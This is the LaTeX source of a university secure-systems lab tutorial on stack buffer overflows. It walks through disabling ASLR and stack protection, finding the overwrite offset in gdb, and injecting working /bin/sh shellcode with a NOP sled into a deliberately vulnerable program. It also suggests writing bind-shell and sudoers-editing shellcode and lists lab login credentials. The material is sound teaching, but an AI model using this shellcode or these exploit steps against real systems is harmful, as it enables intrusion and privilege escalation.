\documentclass{article}
\usepackage[top=3.1cm, bottom=3.1cm, left=2.5cm, right=2.5cm]{geometry}
\usepackage[T1]{fontenc}
\usepackage[utf8]{inputenc}
\usepackage[english]{babel}
\usepackage{graphicx}
\usepackage[toc,page]{appendix} 
\usepackage{eurosym}
\usepackage{gensymb}
\usepackage[dvipsnames]{xcolor}
\usepackage[normal]{caption}
\usepackage{mathtools, bm}
\usepackage{amssymb, bm}
%\usepackage{wrapfig}
\usepackage{floatflt}
\usepackage{enumitem}
\usepackage{MnSymbol,wasysym}
\usepackage[export]{adjustbox}
\usepackage{float}
\usepackage{fancyhdr}
\pagestyle{fancy}
\usepackage{titlesec}
\usepackage{soul}
\usepackage{amsmath,amsfonts,amssymb}
\usepackage{hyperref}
\usepackage{qtree}
%\usepackage{chemfig}
\usepackage{tikz}
\usepackage{pgfplots}
\usepackage{multicol}
\usepackage{multirow}
\usepackage{pgffor}
\usepackage{qtree}
%\usepackage{mhchem}
%\usepackage[demo]{graphicx}
\usepackage{subcaption}
\usepackage{listings}
\usepackage[squaren, Gray, cdot]{SIunits}
\usepackage{inconsolata}
\usepackage{minted}
%\usepackage{syntax} %Fait planter latex pour une raison quelconque

\usepackage{color}
\definecolor{pblue}{rgb}{0.13,0.13,1}
\definecolor{pgreen}{rgb}{0,0.5,0}
\definecolor{pred}{rgb}{0.9,0,0}
\definecolor{pgrey}{rgb}{0.46,0.45,0.48}
\definecolor{mediumslateblue}{rgb}{0.48, 0.41, 0.93}
\definecolor{electricviolet}{rgb}{0.56, 0.0, 1.0}

\newcommand{\bmat}[4]{\begin{bmatrix} #1 & #2 \\ #3 & #4\end{bmatrix}}
\newcommand{\bmatn}[9]{\begin{bmatrix} #1 & #2 & #3\\ #4 & #5 & #6 \\ #7 & #8 & #9\end{bmatrix}}

\renewcommand{\labelitemii}{$\bullet$}
\renewcommand{\labelitemiii}{$\circ$}
%\renewcommand{\labelitemiv}{$\bullet$}


\newcommand{\codecourse}{LINGI2144}
\newcommand{\titlecourse}{Secured System Engineering}
\newcommand{\othor}{\\
\textsc{Crochet} Christophe\\
\textsc{Duchene} Fabien\\
\textsc{Given-Wilson} Thomas\\
\textsc{Strebelle} Sebastien}
\newcommand{\professor}{\textsc{Legay} Axel}
\newcommand{\ayear}{2020 - 2021}
\newcommand{\year}{2020}

\newenvironment{Figure} %for multicols
  {\par\medskip\noindent\minipage{\linewidth}}
  {\endminipage\par\medskip}

\usepackage{listings}

\lstset{
  basicstyle=\ttfamily,
  keywordstyle=\color{pblue},
  keywordstyle=[2]{\color{mediumslateblue}},
  keywordstyle=[3]{\color{electricviolet}},
  identifierstyle=\color{black},
  commentstyle=\itshape\color{pgreen},
  stringstyle=\color{pred},
  language=Java,
  showspaces=false,
  showtabs=false,
  breaklines=true,
  showstringspaces=false,
  breakatwhitespace=true,
  aboveskip=0.3cm,belowskip=0.3cm,
  mathescape=true,
  moredelim=[il][\textcolor{pgrey}]{\$\$},
  moredelim=[is][\textcolor{pgrey}]{\%\%}{\%\%},
  morekeywords={then,end,type,String},
  morekeywords=[2]{invariant,variant,var},
  extendedchars=true,
  literate=
	{á}{{\'a}}1 {é}{{\'e}}1 {í}{{\'i}}1 {ó}{{\'o}}1 {ú}{{\'u}}1
	{Á}{{\'A}}1 {É}{{\'E}}1 {Í}{{\'I}}1 {Ó}{{\'O}}1 {Ú}{{\'U}}1
	{à}{{\`a}}1 {è}{{\`e}}1 {ì}{{\`i}}1 {ò}{{\`o}}1 {ù}{{\`u}}1
	{À}{{\`A}}1 {È}{{\'E}}1 {Ì}{{\`I}}1 {Ò}{{\`O}}1 {Ù}{{\`U}}1
	{ä}{{\"a}}1 {ë}{{\"e}}1 {ï}{{\"i}}1 {ö}{{\"o}}1 {ü}{{\"u}}1
	{Ä}{{\"A}}1 {Ë}{{\"E}}1 {Ï}{{\"I}}1 {Ö}{{\"O}}1 {Ü}{{\"U}}1
	{â}{{\^a}}1 {ê}{{\^e}}1 {î}{{\^i}}1 {ô}{{\^o}}1 {û}{{\^u}}1
	{Â}{{\^A}}1 {Ê}{{\^E}}1 {Î}{{\^I}}1 {Ô}{{\^O}}1 {Û}{{\^U}}1
	{œ}{{\oe}}1 {Œ}{{\OE}}1 {æ}{{\ae}}1 {Æ}{{\AE}}1 {ß}{{\ss}}1
	{ű}{{\H{u}}}1 {Ű}{{\H{U}}}1 {ő}{{\H{o}}}1 {Ő}{{\H{O}}}1
	{ç}{{\c c}}1 {Ç}{{\c C}}1 {ø}{{\o}}1 {å}{{\r a}}1 {Å}{{\r A}}1
	{€}{{\EUR}}1 {£}{{\pounds}}1
}
\pagenumbering{roman}
\title{\codecourse : \titlecourse}
\author{\othor}
\date{September \year}
\fancyhead[R]{\codecourse}

\renewcommand{\footrulewidth}{pt}
\fancyfoot[L]{\codecourse}
\fancyfoot[C]{Page \thepage}
\fancyfoot[R]{\year}

\newcommand{\colR}[1]{\color{red}{#1}}
\newcommand{\colRB}[1]{\color{red}{[#1]}}
\newcommand{\sep}{\ \wedge\ }

\DeclareMathOperator{\fib}{fib}
\DeclareMathOperator{\ok}{ok}
\DeclareMathOperator{\abs}{abs}

\pgfplotsset{compat=1.14}

\begin{document}
        \hfill\includegraphics[scale=0.5]{image/logoepl.png}
        
        \vspace*{\fill}
            
        \begin{center}
        
            \rule{1\textwidth}{1pt}\\
	            \vspace{0.5\baselineskip}
		            \begin{LARGE}
	                	\textbf{\codecourse : \titlecourse}\\
	                	Tutorial 5: Buffer Overflows and Shellcodes
		            \end{LARGE}
		        \vspace{0.5\baselineskip}       
	        \rule{1\textwidth}{1pt}\\
	        
	        \vspace{0.5\baselineskip}
	        
	        \includegraphics[scale=1.5]{image/MCP.jpg}\\

	        \vspace{0.5\baselineskip}
	            Academic year : \ayear\\
                
		\end{center}
		
            \vspace*{\fill}
            
        \begin{tabular}{l@{\hspace{0.0cm}}r}
        
                \begin{minipage}{7cm}\noindent\textbf{Teacher :} \professor\\
                \noindent\textbf{Course :} \codecourse\\
                \noindent\textbf{Collaborators :} \othor 
                \end{minipage}
                &
                
        \end{tabular} 

\newpage

%\tableofcontents

\newpage
\pagenumbering{arabic}
%\begin{itemize} //Bullet points
%    \item [$\bullet$]
%    \item [$\bullet$]
%\end{itemize}

%\begin{multicols}{2} //Multicolonne
%
%\vfill\null
%\columnbreak
%
%\end{multicols}

%\begin{figure}[h]
%    \centering
%    \includegraphics[scale = 0.7]{image/10.PNG}
%    \caption{Titre}
%    \label{fig:titre}
%\end{figure}


\section{Prerequisite}
NOTE: Very few files are provided for this week, so no sub-directories
are used. Also, all the files provided as examples not as fixed inputs, feel free
to edit them to assist in the goals of the tutorial. This may include changes
to variables, sizes of buffers, etc. The focus today is on crafting and implementation exploits, the exact over
ow mechanism is much less important.\\

\noindent Connection:
\begin{table}[h!]
\centering
\label{tab:my-table}
\begin{tabular}{c|c}
\textbf{username} & \textbf{password} \\ \hline
admin          & nimda         
\end{tabular}
\end{table}

\subsection{Environment Configuration}
On most Linux systems and with most compilers there are protections built
in to prevent various exploits. For today's tutorial we may have to turn some
of these off.\\

\noindent One is the randomisation of memory segments by the Linux kernel. We
can see the current value with
\begin{center}
    \lstinline{sudo cat /proc/sys/kernel/randomize_va_space}
\end{center}
\noindent This is "2" by default on Kali Linux (and most Linux systems). To turn this off for the rest of the sessions by setting the value to "0" we can run
\begin{center}
    \lstinline{echo 0 | sudo tee /proc/sys/kernel/randomize_va_space}\\
    \lstinline{sudo cat /proc/sys/kernel/randomize_va_space}
\end{center}
\noindent The compiler can also insert various protections into code that is compiled.
For the stack, \lstinline{gcc} includes some stack protection by default on many
versions. We can force this to be turned off with the argument
\begin{center}
    \lstinline{-fno-stack-protector}
\end{center}
\noindent At times we may also wish to force gcc to compile code with executable
instructions on the stack, we can enable this with
\begin{center}
    \lstinline{-z execstack}
\end{center}


\section{Exercise}
\subsection{Revisit Shellcode Injection}
Last week we looked at spawning a shell with a shellcode. Recall that the
shellcode was provided already in the code. However, we can also create our
own shellcode for example starting with the assembly in "\lstinline{testshell.s}":
\begin{center}
    \lstinline{as testshell.s -o testshell.o}\\
    \lstinline{ld testshell.o -o testshell}\\
    \lstinline{objdump -d testshell}
\end{center}
\noindent which will show you the machine instructions. These can then be turned into
the string you will find in "\lstinline{example.c}".\\


\noindent In "\lstinline{example.c}" you will find a simple C program that already has the
code for a shellcode defined as a string.\\

\noindent The rest of the program merely
points to this string and executes the "string". We can compile and run the
program with
\begin{center}
    \lstinline{gcc -g -fno-stack-protector -z execstack -o example example.c}\\
    \lstinline{./example}
\end{center}
\noindent Note that we compile to allow execution of the stack since the program we wish to execute is on the stack as the shellcode.\\

\noindent When the program runs we are dropped into a \lstinline{/bin/sh} shell that we can
operate in. We can exit this shell now we have shown that it works.\\

\noindent Now let's combine our shellcode with a buffer over
ow from last week and
gain a shell. We can see in the code for "\lstinline{vulnerable.c}" and we can observe
that there is a copy of the first argument to the code on the stack. If we
compile the code with
\begin{center}
    \lstinline{gcc -g -fno-stack-protector -z execstack -o vulnerable vulnerable.c}\\
    \lstinline{./vulnerable}
\end{center}
\noindent that we could try and inject the shellcode into via a command line argument. To find where to do this run vulnerable in gdb:
\begin{center}
    \lstinline{gdb -q vulnerable}
\end{center}
\noindent and break in the function "\lstinline{func}", pass in an argument (we don't need to overflow now) and then break at the leave of the function to see where the return to main is on the stack and how much to overflow. These are the commands that worked for me:
\begin{center}
    \lstinline{break func}\\
    \lstinline{run `perl -e 'print "A"x60'`}\\
    \lstinline{disass main}
\end{center}
\noindent observe the address of the instruction after \lstinline{func}, for me it was \lstinline{0x0040122f}.
\begin{center}
    \lstinline{disass func}
\end{center}
\noindent put a break point on the return call (for me at address \lstinline{0x004011e1})
\begin{center}
    \lstinline{b *0x004011e2}
\end{center}

\noindent now observe the content of the local variable "\lstinline{buf}":
\begin{center}
    \lstinline{x/24xw buf}\\
    \lstinline{c}\\
    \lstinline{x/24xw buf}
\end{center}
\noindent we are now at the end of the function and have seen how much we over-write and where the return call is. For my version I would need to write another 16 bytes to overwrite the \lstinline{EIP} stored on the stack (total of 80 bytes).\\

\noindent Now we include the shellcode in the perl string and the address we want
to write to (the address where "\lstinline{buf}" is). For me the address of "\lstinline{buf}" was
\lstinline{0xbffff230}. So now I just need to combine all these parts into a single command to send to the program was the command that worked for me:
\begin{lstlisting}
run `perl -e 'print "\x90"x21  
    . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88
        \x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd
        \x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41
        \x41\x42\x42\x42\x42" 
    . "\x40\xf2\xff\xbf"'` //return address
\end{lstlisting}
\noindent The \lstinline{"\x90"x21} is padding to put the shellcode and the address of \lstinline{buf} (after the shell code) into the right position.\\

\noindent Note that "\lstinline{\x90}" is a non-operation on x86 and so the program will execute this "nop sled" to reach the shellcode.\\

\noindent This will now drop you into a shell if run from \lstinline{gdb}... but will may crash if you have breakpoints. To have the optimal outcome you may need to quit out of \lstinline{gdb} and restart \lstinline{gdb}, but then the shellcode should execute without any problem and drop you into a shell.\\

\noindent Finally, note that addresses inside \lstinline{gdb} and outside of \lstinline{gdb} can change!
Your shellcode will probably not run the same if passed on the command line with:
\begin{lstlisting}
./vulnerable `perl -e 'print "\x90"x21  
    . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88
        \x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd
        \x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41
        \x41\x42\x42\x42\x42" 
    . "\x40\xf2\xff\xbf"'` //return address
?????????????????????1??F1?1??[1??C??C
                                    ?
                                        ??S
                                       ?????/bin/shNAAAABBBB@???
Illegal instruction
\end{lstlisting}
\noindent To fix this you need to find where the address is and this can/will change, here
is the output from my VM, but again your addresses may change different
(and I didn't guess first change):
\begin{lstlisting}[mathescape=false]
./vulnerable `perl -e 'print "\x90"x21  
    . "..." . "\x90\xf2\xff\xbf"'` //close new return address
?????????????????????1??F1?1??[1??C??C
                                    ?
                                        ??S
                                       ?????/bin/shNAAAABBBB@???
$
\end{lstlisting}
\noindent By now you should be able to reproduced the above behaviour so you can
progress with the tutorial.\\


\noindent BONUS: Last week we also had "\lstinline{exploitme.c}" that has potential ways
to manipulate the stack due to an off by one error. See if you can inject your
shellcode here. Note that this will probably require compiling with clang
instead of \lstinline{gcc} and may be tricky, this is purely a bonus if you have time, NOT a priority.

\newpage
\subsection{Write Your Own Shellcode}
The "\lstinline{testshell.s}" is a very simple shellcode to demonstrate the key concepts.
Now you should write your own shell code to do something interesting. The
goal here is for you to be able to build your own shell and then inject it.
Some ideas of things you might want to do are:
\begin{enumerate}
    \item run a different program to \lstinline{/bin/sh}
    \item telnet to a remote port (or at least pretend it is remote)
    \item open a listening port that when connected to spawns a bash shell for the other side
    \item try to add a line to \lstinline{/etc/sudoers}
    \item and many other ideas
\end{enumerate}
\noindent Note that you can inject this code into any vulnerable program (if you
prefer \lstinline{exploitme.c} this is fine).
% \begin{small}
% \medskip
% \bibliographystyle{IEEEtran}
% \bibliography{bib}
% \nocite{*}
% \renewcommand\mkbibnamefamily[1]{\textbf{#1}}
% \end{small}
\end{document}
